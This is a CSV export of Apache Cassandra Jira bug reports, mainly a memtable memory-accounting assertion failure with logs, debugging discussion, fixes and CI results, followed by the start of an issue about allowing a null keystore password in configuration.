Summary,Issue key,Issue id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Outward issue link (Blocked),Inward issue link (Blocker),Outward issue link (Blocker),Inward issue link (Child-Issue),Inward issue link (Cloners),Inward issue link (Completes),Outward issue link (Completes),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Problem/Incident),Inward issue link (Problem/Incident),Outward issue link (Problem/Incident),Outward issue link (Problem/Incident),Outward issue link (Problem/Incident),Outward issue link (Problem/Incident),Inward issue link (Reference),Inward issue link (Reference),Inward issue link (Reference),Inward issue link (Reference),Inward issue link (Reference),Inward issue link (Reference),Outward issue link (Reference),Outward issue link (Reference),Outward issue link (Reference),Outward issue link (Reference),Inward issue link (Regression),Outward issue link (Required),Outward issue link (Required),Outward issue link (Supercedes),Inward issue link (Testing),Inward issue link (Testing),Outward issue link (Testing),Outward issue link (Testing),Outward issue link (Testing),Inward issue link (dependent),Outward issue link (dependent),Attachment,Attachment,Attachment,Attachment,Custom field (Affects version (Component)),Custom field (Attachment count),Custom field (Authors),Custom field (Authors),Custom field (Authors),Custom field (Authors),Custom field (Blog - New Blog Administrators),Custom field (Blog - New Blog PMC),Custom field (Blog - Write access),Custom field (Blog Administrator?),Custom field (Blogs - Admin for blog),Custom field (Blogs - Email Address),Custom field (Blogs - Existing Blog Access Level),Custom field (Blogs - Existing Blog Name),Custom field (Blogs - New Blog Write Access),Custom field (Blogs - Username),Custom field (Bug Category),Custom field (Bugzilla - Email Notification Address),Custom field (Bugzilla - List of usernames),Custom field (Bugzilla - PMC Name),Custom field (Bugzilla - Project Name),Custom field (Bugzilla Id),Custom field (Bugzilla Id),Custom field (Change Category),Custom field (Complexity),Custom field (Discovered By),Custom field (Docs Text),Custom field (Enable Automatic Patch Review),Custom field (Epic Link),Custom field (Estimated Complexity),Custom field (Evidence Of Open Source Adoption),Custom field (Evidence Of Registration),Custom field (Evidence Of Use On World Wide Web),Custom field (Existing GitBox Approval),Custom field (External issue ID),Custom field (External issue URL),Custom field (Fix version (Component)),Custom field (Git Notification Mailing List),Custom field (Git Repository Import Path),Custom field (Git Repository Name),Custom field (Git Repository Type),Custom field (GitHub Options),Custom field (Github Integration),Custom field (Github Integrations - Other),Custom field (Global Rank),Custom field (INFRA - Subversion Repository Path),Custom field (Impacts),Custom field (Initial Confluence Contributors),Custom field (Last public comment date),Custom field (Level of effort),Custom field (Machine Readable Info),Custom field (Mentor),Custom field (New-TLP-TLPName),Custom field (Original story points),Custom field (Parent Link),Custom field (Platform),Custom field (Priority),Custom field (Project),Custom field (Protected Branch),Custom field (Rank),Custom field (Rank (Obsolete)),Custom field (Review Date),Custom field (Reviewer),Custom field (Reviewer),Custom field (Reviewers),Custom field (Reviewers),Custom field (Reviewers),Custom field (Reviewers),Custom field (Severity),Custom field (Severity),Custom field (Since Version),Custom field (Skill Level),Custom field (Source Control Link),Custom field (Space Description),Custom field (Space Key),Custom field (Space Name),Custom field (Start Date),Custom field (Tags),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Test and Documentation Plan),Custom field (Testcase included),Custom field (Tester),Custom field (Tester),Custom field (Workaround),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
Improve memtable allocator accounting when updating AtomicBTreePartition,CASSANDRA-18125,13514734,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,benedict,nicolas.henneaux,nicolas.henneaux,19/Dec/22 12:46,31/Mar/23 18:07,13/Jul/23 08:40,07/Mar/23 17:58,4.0.9,4.1.1,5.0,,,,Local/Memtable,,,,0,,"On two nodes (on a 5 nodes cluster) on the cluster I'm running, I got the following exception. It occurred at 3,5 minutes interval.

{code}
MemtableReclaimMemory:2625 org.apache.cassandra.service.CassandraDaemon uncaughtException - Exception in thread Thread[MemtableReclaimMemory:2625,5,main]java.lang.AssertionError: null
	at org.apache.cassandra.utils.memory.MemtablePool$SubPool.released(MemtablePool.java:193)
	at org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.releaseAll(MemtableAllocator.java:151)
	at org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.setDiscarded(MemtableAllocator.java:142)
	at org.apache.cassandra.utils.memory.MemtableAllocator.setDiscarded(MemtableAllocator.java:93)
	at org.apache.cassandra.utils.memory.SlabAllocator.setDiscarded(SlabAllocator.java:120)
	at org.apache.cassandra.db.Memtable.setDiscarded(Memtable.java:201)
	at org.apache.cassandra.db.ColumnFamilyStore$Flush$1.runMayThrow(ColumnFamilyStore.java:1216)
	at org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:829)

{code} 

{code}
$ nodetool info
ID                     : 
Gossip active          : true
Native Transport active: true
Load                   : 204.67 GiB
Generation No          : 1670343179
Uptime (seconds)       : 1110514
Heap Memory (MB)       : 7218.07 / 24576.00
Off Heap Memory (MB)   : 784.06
Data Center            : par
Rack                   : e1
Exceptions             : 1
Key Cache              : entries 802712, size 100 MiB, capacity 100 MiB, 774541004 hits, 914207516 requests, 0.847 recent hit rate, 14400 save period in seconds
Row Cache              : entries 0, size 0 bytes, capacity 0 bytes, 0 hits, 0 requests, NaN recent hit rate, 0 save period in seconds
Counter Cache          : entries 0, size 0 bytes, capacity 50 MiB, 0 hits, 0 requests, NaN recent hit rate, 7200 save period in seconds
Percent Repaired       : 2.3272298419424144E-5%
Token                  : (invoke with -T/--tokens to see all 8 tokens)

$ java -version
openjdk version ""11.0.16"" 2022-07-19 LTS
OpenJDK Runtime Environment (Red_Hat-11.0.16.0.8-1.el7_9) (build 11.0.16+8-LTS)
OpenJDK 64-Bit Server VM (Red_Hat-11.0.16.0.8-1.el7_9) (build 11.0.16+8-LTS, mixed mode, sharing)
$ nodetool version
ReleaseVersion: 4.0.6
{code}",,adelapena,benedict,blerer,brandon.williams,jonmeredith,maedhroz,mck,nicolas.henneaux,nvollmar,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18360,,,,,,,,,,CASSANDRA-18159,CASSANDRA-18253,CASSANDRA-18266,,,,,,,,,,,,,,,,,,0.0,benedict,,,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Challenging,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Mar 31 18:06:40 UTC 2023,,,,,,,All,,,,"0|z1e8i0:",9223372036854775807,,,,blerer,jmeredithco,,,Normal,,4.0.5,,https://github.com/apache/cassandra/commit/40f9ca60f103783aa481bc9a91b92fd55b4ea625,,,,,,,,,Test included that reproduces issue and checks fixed.,,,,,"19/Dec/22 18:24;maedhroz;Thanks for the report!

Is there any chance you could provide a little more information around the following?

1.) Are secondary indexes in use?
2.) Is this an overwrite-heavy write workload?
3.) Are off-heap memtables in use?;;;","19/Dec/22 18:33;benedict;In general further details would be great, including any involved schema, and any log messages around memtable flushes that occur either side of the error.;;;","19/Dec/22 18:58;nicolas.henneaux;Thanks for your feedback, of course I can provide more details.

1. There is no secondary index in use.
2. Not sure what is really heavy but I don't believe it is heavy, each node has ~200GB of data with ttl of 10 days for most of the data (~20GB written by day). About overwrite, I guess you mean updating some cells, yes we usually insert then update a row within a short time frame (~10min).
3. I don't think off-heap is used. If disabled by default, that's not something I enabled

A compaction was running it seems. I got a lot of 
- TWCS skipping check for fully expired SSTables
- TWCS expired check sufficiently far in the past, checking for fully expired SSTables

Here is an extract of the logs around ~1min
{code}
Dec 19, 2022 @ 13:07:51.334COMMIT-LOG-ALLOCATOR org.apache.cassandra.db.ColumnFamilyStore logFlush - Enqueuing flush of T4: 35.156KiB (0%) on-heap, 0.000KiB (0%) off-heap
Dec 19, 2022 @ 13:07:51.334COMMIT-LOG-ALLOCATOR org.apache.cassandra.db.ColumnFamilyStore logFlush - Enqueuing flush of T3: 852.600KiB (0%) on-heap, 0.000KiB (0%) off-heap
Dec 19, 2022 @ 13:07:51.334COMMIT-LOG-ALLOCATOR org.apache.cassandra.db.ColumnFamilyStore logFlush - Enqueuing flush of T2: 41.210KiB (0%) on-heap, 0.000KiB (0%) off-heap
Dec 19, 2022 @ 13:07:51.334COMMIT-LOG-ALLOCATOR org.apache.cassandra.db.ColumnFamilyStore logFlush - Enqueuing flush of T1: 364.268KiB (0%) on-heap, 0.000KiB (0%) off-heap
Dec 19, 2022 @ 13:07:15.561NonPeriodicTasks:1 org.apache.cassandra.io.sstable.SSTable delete - Deleting sstable: /data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-26-big
Dec 19, 2022 @ 13:07:15.560CompactionExecutor:6104 org.apache.cassandra.db.compaction.CompactionTask runMayThrow - Compacted (ad77aef0-7f95-11ed-bab7-e7d7c3e60f28) 2 sstables to [/data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-29-big,] to level=0.  5.429KiB to 5.426KiB (~99% of original) in 9ms.  Read Throughput = 593.925KiB/s, Write Throughput = 593.604KiB/s, Row Throughput = ~118/s.  59 total partitions merged to 58.  Partition merge counts were {1:57, 2:1, }
Dec 19, 2022 @ 13:07:15.560NonPeriodicTasks:1 org.apache.cassandra.io.sstable.SSTable delete - Deleting sstable: /data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-27-big
Dec 19, 2022 @ 13:07:15.551MemtableReclaimMemory:2628 org.apache.cassandra.service.CassandraDaemon uncaughtException - Exception in thread Thread[MemtableReclaimMemory:2628,5,main]java.lang.AssertionError: null
	at org.apache.cassandra.utils.memory.MemtablePool$SubPool.released(MemtablePool.java:193)
	at org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.releaseAll(MemtableAllocator.java:151)
	at org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.setDiscarded(MemtableAllocator.java:142)
	at org.apache.cassandra.utils.memory.MemtableAllocator.setDiscarded(MemtableAllocator.java:93)
	at org.apache.cassandra.utils.memory.SlabAllocator.setDiscarded(SlabAllocator.java:120)
	at org.apache.cassandra.db.Memtable.setDiscarded(Memtable.java:201)
	at org.apache.cassandra.db.ColumnFamilyStore$Flush$1.runMayThrow(ColumnFamilyStore.java:1216)
	at org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:829)
Dec 19, 2022 @ 13:07:15.551MemtablePostFlush:2626 org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager archiveAndDiscard - Segment CommitLogSegment(/data/cassandra/commitlog/CommitLog-7-1670343439312.log) is no longer active and will be deleted now
Dec 19, 2022 @ 13:07:15.551MemtablePostFlush:2626 org.apache.cassandra.db.commitlog.CommitLog discardCompletedSegments - Commit log segment CommitLogSegment(/data/cassandra/commitlog/CommitLog-7-1670343439312.log) is unused
Dec 19, 2022 @ 13:07:15.551CompactionExecutor:6104 org.apache.cassandra.db.compaction.TimeWindowCompactionStrategy newestBucket - bucket size 2 >= 2 and not in current bucket, compacting what's here: [BigTableReader(path='/data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-27-big-Data.db'), BigTableReader(path='/data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-26-big-Data.db')]
Dec 19, 2022 @ 13:07:15.551CompactionExecutor:6104 org.apache.cassandra.db.compaction.CompactionTask runMayThrow - Compacting (ad77aef0-7f95-11ed-bab7-e7d7c3e60f28) [/data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-27-big-Data.db:level=0, /data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-26-big-Data.db:level=0, ]
Dec 19, 2022 @ 13:07:15.550MemtableFlushWriter:3385 org.apache.cassandra.db.ColumnFamilyStore flushMemtable - Flushed to [BigTableReader(path='/data/cassandra/data/system_distributed/parent_repair_history-deabd734b99d3b9c92e5fd92eb5abf14/nb-31-big-Data.db')] (1 sstables, 7.193KiB), biggest 7.193KiB, smallest 7.193KiB
Dec 19, 2022 @ 13:07:15.550MemtableFlushWriter:3384 org.apache.cassandra.db.ColumnFamilyStore flushMemtable - Flushed to [BigTableReader(path='/data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-28-big-Data.db')] (1 sstables, 6.510KiB), biggest 6.510KiB, smallest 6.510KiB
Dec 19, 2022 @ 13:07:15.546PerDiskMemtableFlushWriter_0:3385 org.apache.cassandra.db.Memtable writeSortedContents - Completed flushing /data/cassandra/data/system_distributed/parent_repair_history-deabd734b99d3b9c92e5fd92eb5abf14/nb-31-big-Data.db (4.170KiB) for commitlog position CommitLogPosition(segmentId=1670343439574, position=3282)
Dec 19, 2022 @ 13:07:15.545PerDiskMemtableFlushWriter_0:3384 org.apache.cassandra.db.Memtable writeSortedContents - Completed flushing /data/cassandra/data/system_distributed/repair_history-759fffad624b318180eefa9a52d1f627/nb-28-big-Data.db (1.785KiB) for commitlog position CommitLogPosition(segmentId=1670343439574, position=1779)
Dec 19, 2022 @ 13:07:15.545PerDiskMemtableFlushWriter_0:3384 org.apache.cassandra.db.Memtable writeSortedContents - Writing Memtable-repair_history@685478737(-8.285KiB serialized bytes, 246 ops, -0%/0% of on/off-heap limit), flushed range = (min(-9223372036854775808), max(9223372036854775807)]Dec 19, 2022 @ 13:07:15.545PerDiskMemtableFlushWriter_0:3385 org.apache.cassandra.db.Memtable writeSortedContents - Writing Memtable-parent_repair_history@860004687(5.211KiB serialized bytes, 2 ops, 0%/0% of on/off-heap limit), flushed range = (min(-9223372036854775808), max(9223372036854775807)]Dec 19, 2022 @ 13:07:15.543COMMIT-LOG-ALLOCATOR org.apache.cassandra.db.ColumnFamilyStore logFlush - Enqueuing flush of parent_repair_history: 14.763KiB (0%) on-heap, 0.000KiB (0%) off-heap
Dec 19, 2022 @ 13:07:15.542COMMIT-LOG-ALLOCATOR org.apache.cassandra.db.ColumnFamilyStore logFlush - Enqueuing flush of repair_history: -8.000KiB (-0%) on-heap, 0.000KiB (0%) off-heap
Dec 19, 2022 @ 13:06:22.905ReadStage-1 org.apache.cassandra.utils.memory.BufferPool log - Maximum memory usage reached (512.000MiB), cannot allocate chunk of 8.000MiB
Dec 19, 2022 @ 13:05:36.979NonPeriodicTasks:1 org.apache.cassandra.io.sstable.SSTable delete - Deleting sstable: /data/cassandra/data/X/Y-48b97b403c1011eab0e9f58b98b870bd/nb-2963-big
Dec 19, 2022 @ 13:05:36.979CompactionExecutor:6105 org.apache.cassandra.db.compaction.CompactionTask runMayThrow - Compacted (72b6a320-7f95-11ed-bab7-e7d7c3e60f28) 1 sstables to [] to level=0.  0.000KiB to 0.000KiB (~0% of original) in 1ms.  Read Throughput = 0.000KiB/s, Write Throughput = 0.000KiB/s, Row Throughput = ~0/s.  0 total partitions merged to 0.  Partition merge counts were {}
{code}
;;;","19/Dec/22 19:12;benedict;Thanks. To be clear, I'm looking for the schema of the table involved in the problematic memtable flush. It looks like quite a few flushes might be candidates, but if there are a lot of these log messages it might be possible to pinpoint a specific Memtable (or else we could perhaps patch to include the table in the error message).

The likeliest explanation is that there is some non-determinism in the Memtable accounting, so we want to pinpoint the potential places this might be occurring, and so the more information we can use to narrow down the candidate code locations the better.;;;","19/Dec/22 19:21;nicolas.henneaux;I cannot share the schema. There are 110 tables with 76 keyspaces. One table contains ~75% of the data mainly from a data payload in a {{text}} cell.;;;","12/Jan/23 09:09;nvollmar;Recently we ran into this as well, immediately preceding the exception there was the warn log:
{code:java}
Unable to lock JVM memory (ENOMEM). This can result in part of the JVM being swapped out, especially with mmapped I/O enabled. Increase RLIMIT_MEMLOCK. {code}
(Cassandra 4.0.7 / OpenJDK 11.0.17);;;","12/Jan/23 21:05;benedict;Are you able to (privately) share detailed logs and schema information, so we can perhaps ascertain some information about the workload that might have triggered this problem?

The exception you mention is very unlikely to be related, though it does suggest this is all happening on startup?;;;","13/Jan/23 08:46;nvollmar;In our case 4 out of 5 Cassandra crashed one after another within a 2 hour windows after a couple of months of uptime.

We have ~40 keyspaces with most of the data in Akka Persistence Cassandra Schema: [https://doc.akka.io/docs/akka-persistence-cassandra/current/journal.html];;;","13/Jan/23 10:33;benedict;The ENOMEM log message only occurs at startup, so if your timeline is correct this error occurred after your processes first crashed, not before.

Debugging problems like this requires very detailed information, including full logs and the ability to map table names to specific schema, as well as information about what queries were being run against the processes. Most of the data being in one schema is not very helpful information, unfortunately.;;;","15/Jan/23 12:09;benedict;Looks like we may have a reproduction anyway: CASSANDRA-18159 looks plausibly the same issue.;;;","17/Feb/23 18:00;benedict;Ok, so the simulator has given us a nice reproduction, and has permitted us to easily trace this back to CASSANDRA-15511. Specifically, we apply the same {{retain}} calculation erroneously to _not yet inserted_ data, thereby corrupting the memtable memory usage accounting.

Simple fix [here|https://github.com/apache/cassandra/pull/2169];;;","17/Feb/23 18:02;benedict;/cc [~blerer];;;","20/Feb/23 09:30;blerer;Thanks [~benedict], I will look at it today.;;;","22/Feb/23 08:39;blerer;[~benedict] Do you have some tests that reproduce the problem that can be added to the patch?;;;","22/Feb/23 09:00;benedict;Jon Meredith is rustling some up;;;","22/Feb/23 19:20;jonmeredith;I've pushed up a couple of different reproducers here

org.apache.cassandra.db.partitions.AtomicBTreePartitionMemtableAccountingTest is probably the way to go in https://github.com/jonmeredith/cassandra/commit/f7452772c70b8c75da096ca1ee4375f113560f69 

At the moment the test fails with Bendict's fix applied as the recreated partition size is not identical. I'm not sure if it's possible to pick a different cloner that will always clone the input to a dedicated buffer to make the test repeatable. I'd like to extend the test with something generative so that we cover a wider range of types, partition deletion, range tombstone and complex column deletion.

My previous attempt triggers the assertion, but doesn't fail the test as the flush exception is not propagated back to the test runner.
https://github.com/jonmeredith/cassandra/commit/41e1193767ba3a0a42ab2d2b2bbac2f32f22d3de

Tests probably need a bit of cleaning up before they should be included in a patch, but wanted to share what I had so far.;;;","25/Feb/23 00:33;jonmeredith;I've finished a more comprehensive test and pushed a branch including Benedicts fix.  The open question is whether it is reasonable to try and account accurately account for how much onHeap ownership there is. Benedict came up with a handy way to calculate it, but it currently fails to account for static rows.  The good news is that with the fix I'm unable to trigger the assertion when releasing the allocator.

https://github.com/jonmeredith/cassandra/tree/c18125-repro-trunk;;;","27/Feb/23 23:34;jonmeredith;So Benedict has fixed the issues with the code/test as I shared it, but unfortunately there was a copy/paste bug in the test that meant complex column deletion was not being set on the partition update. Back to failing.

I've pushed recent changes, which resolve these non-test issues

1) our cloning behaviour is broken for complex columns, we don’t clone empty byte buffers with cell paths
2) we aren’t counting additional allocations for btree backing arrays when we update one leaf with the contents of another leaf
3) if we merge two cells, we copy the contents whether or not they are already in the memtable
4) when copying back on heap from memtable during read, if we are off heap, we do it at least three times
;;;","28/Feb/23 16:35;jonmeredith;Pushed up another round of fixes, tests now pass. I'm planning on looking the code over and doing some comparisons of heap usage before/after the changes.;;;","28/Feb/23 21:53;smiklosovic;Great progress, [~jonmeredith] . I am watching this closely. I wanted to cut 4.1.1 recently and this one is basically the one which was suggested that it would be a bummer if it was not in. ;;;","02/Mar/23 00:39;jonmeredith;Cleaned everything up and squashed for a clean review base as it didn't seem like anybody else had started. There are minor differences between each branch, but fortunately the accounting is the same between the branches.

4.0: [PR|https://github.com/apache/cassandra/pull/2186] [branch|https://github.com/jonmeredith/cassandra/tree/c18125-repro-4.0]
4.1: [PR|https://github.com/apache/cassandra/pull/2187] [branch|https://github.com/jonmeredith/cassandra/tree/c18125-repro-4.1]
trunk: [PR|https://github.com/apache/cassandra/pull/2188] [branch|https://github.com/jonmeredith/cassandra/tree/c18125-repro-trunk]

I temporarily modified the test to output allocation info for the exhaustive test and compared the two sets of output. Numbers seem very comparable - the new logic reports a little lower but as you'd hope never negative like before. ;;;","02/Mar/23 03:16;jonmeredith;CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-18125-cassandra-4.0-EB9273A6-9018-45C1-8C26-127906CD33BE]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-18125-cassandra-4.0-EB9273A6-9018-45C1-8C26-127906CD33BE]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2311/]|
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-18125-cassandra-4.1-EB9273A6-9018-45C1-8C26-127906CD33BE]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-18125-cassandra-4.1-EB9273A6-9018-45C1-8C26-127906CD33BE]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2312/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-18125-trunk-EB9273A6-9018-45C1-8C26-127906CD33BE]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-18125-trunk-EB9273A6-9018-45C1-8C26-127906CD33BE]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2313/]|;;;","02/Mar/23 21:29;jonmeredith;Analysis of failures - nothing that looks related to the changes. A little suspicious of MemtableSizeTest.testSize[skiplist_sharded], but it is already flaky.

Jenkins failures

+*4.0*+

Test Result (6 failures / +6)
 - dtest-novnode.repair_tests.incremental_repair_test.TestIncRepair.test_multiple_full_repairs_lcs
900s timeout
 - org.apache.cassandra.distributed.upgrade.DropCompactStorageTest.testDropCompactStorage
org.apache.cassandra.exceptions.UnavailableException: Cannot achieve consistency level ALL
CASSANDRA-17674 logged against it, but seems like different failure
passed locally, seems unrelated.
 - org.apache.cassandra.streaming.LongStreamingTest.terminated successfully
junit timeout - perhaps too long a streaming test
passes locally - 2mins
 - org.apache.cassandra.utils.LongBloomFilterTest.testConstrained
junit timeout
passes locally - 1m23sec
 - org.apache.cassandra.repair.RepairJobTest.testNoTreesRetainedAfterDifference-cdc
j11 module system error - looks like trying to measure something inside JFR class.
Unable to make field private final jdk.management.jfr.StreamManager jdk.management.jfr.FlightRecorderMXBeanImpl.streamHandler accessible: module jdk.management.jfr does not ""opens jdk.management.jfr"" to unnamed module @28975c28
 - org.apache.cassandra.db.partition.PartitionImplementationTest.testRowsWithStatic
junit timeout

+*4.1*+

Test Result (3 failures / -3)
 - dtest-novnode.transient_replication_test.TestTransientReplicationRepairStreamEntireSSTable.test_transient_incremental_repair
missing Incoming stream entireSSTable=...from log
 - org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable
https://issues.apache.org/jira/browse/CASSANDRA-17798
junit.framework.AssertionFailedError: If this failed you probably have to raise the beginLocalSampling duration expected:<1> but was:<0>
at org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable(TopPartitionsTest.java:83)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)

+*trunk*+

unable to clean tmp on the arm build

CircleCI failures

+*4.0*+

j8 upgrade - org.apache.cassandra.distributed.upgrade.DropCompactStorageTest - test shutdown timeout

+*4.1*+

j8 org.apache.cassandra.index.sasi.SASICQLTest - testPagingWithClustering-system_keyspace_directory - passes locally, no JIRA, nothing in Butler

j11 org.apache.cassandra.cql3.MemtableSizeTest.testSize[skiplist_sharded] - flaky test with built in retry. Locally fails intermittently on j11 due to java module system exports when trying to measure deep sizes of objects inside the java.desktop module - perhaps related to IDEA java agent or something like that.

+*trunk*+

j8 org.apache.cassandra.db.compaction.CompactionStrategyManagerBoundaryReloadTest
 - https://issues.apache.org/jira/browse/CASSANDRA-18144 - review in progress

 - one shard did not run upgrade tests [https://app.circleci.com/pipelines/github/jonmeredith/cassandra/746/workflows/5e928d77-0717-4ae0-ad1d-7883871c7f8e/jobs/5122]

j11 org.apache.cassandra.db.compaction.CompactionStrategyManagerBoundaryReloadTest also failed
same issue as above.;;;","07/Mar/23 13:15;blerer;The patches looks good to me. Thanks [~jonmeredith], [~benedict].;;;","31/Mar/23 18:06;adelapena;This seems to have made {{o.a.c.cql3.validation.operations.AlterTest#testDropListAndAddListWithSameName}} flaky, as reported in CASSANDRA-18360.

[This run|https://app.circleci.com/pipelines/github/adelapena/cassandra/2758/workflows/f9c1b471-3804-4b9b-acf8-2a1201591088] for the commit immediately before CASSANDRA-18125 succeeds.

[This other run|https://app.circleci.com/pipelines/github/adelapena/cassandra/2757/workflows/ebbe5032-fc89-41c1-9603-f4336f20cdc3] for the 4.1-trunk merge commit of CASSANDRA-18125 fails reproducing the current issue.

[This run|https://app.circleci.com/pipelines/github/adelapena/cassandra/2745/workflows/6eb7b890-40de-4ffe-b1f7-16b26ed19b42] for the current 4.1 branch successes, suggesting that probably the failure only affects trunk. I haven't tested 4.0 yet.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Config parameter keystore_password should be nullable,CASSANDRA-18124,13514236,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maulin.vasavada,rtib,rtib,16/Dec/22 15:09,17/Apr/23 17:14,13/Jul/23 08:40,17/Apr/23 09:14,4.1.2,5.0,,,,,Local/Config,,,,0,,"Some SSL configuration may pass unencrypted private keys. PEMReader might accept that by assuming keyPassword to be null in that case (e.g. https://github.com/apache/cassandra/blob/f9e033f519c14596da4dc954875756a69aea4e78/src/java/org/apache/cassandra/security/PEMReader.java#L103).

Current configuration reader does not accept keystore_password parameter to be set null or empty in the cassandra.yaml.",,brandon.williams,e.dimitrova,frankgh,maedhroz,maulin.vasavada,rtib,smiklosovic,,,,,,,,"maulin-vasavada opened a new pull request, #2225:
URL: https://github.com/apache/cassandra/pull/2225

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
